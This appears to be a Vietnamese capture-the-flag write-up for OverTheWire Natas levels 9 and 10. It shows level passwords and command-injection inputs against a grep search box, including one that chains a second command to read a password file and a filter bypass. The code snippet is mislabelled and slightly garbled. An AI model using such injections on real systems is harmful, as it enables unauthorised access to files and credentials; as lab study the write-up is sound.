# Level 9
###### User: *natas9* Pass: *Sda6t0vkOPkM8YeOZkAGVhFoaplvlJFd*
+ Xem trong source code, thấy thanh tìm kiếm có thể có lỗ hổng *Command Line Injection* khi mà input của người dùng được truyền thẳng đến hệ thống:
```python
...
passthru(“grep -i $key dictionary.txt:);
...
```
+ Insert lệnh vào thanh tìm kiếm:
```
yo; cat /etc/natas_webpass/natas10
```
-> Ra được pass cho level tiếp theo.

# Level 10
###### User: *natas10* Pass: *D44EcsFkLxPIkAAKLosx8z3hxX1Z4MCE*
+ Vẫn như level trước, tuy nhiên trong đoạn code giờ đây đã có thêm hạn chế ký tự đặc biệt nhưng không phải là tất cả:
```python
...
if(preg_match('/[;|&]/', $key)) {
  print "Input contains an illegal character!";
}
...
```
+ Sử dụng lệnh sau để đọc tất cả file trong `/etc/natas_webpass/natas11`:
```
.* /etc/natas_webpass/natas11
```
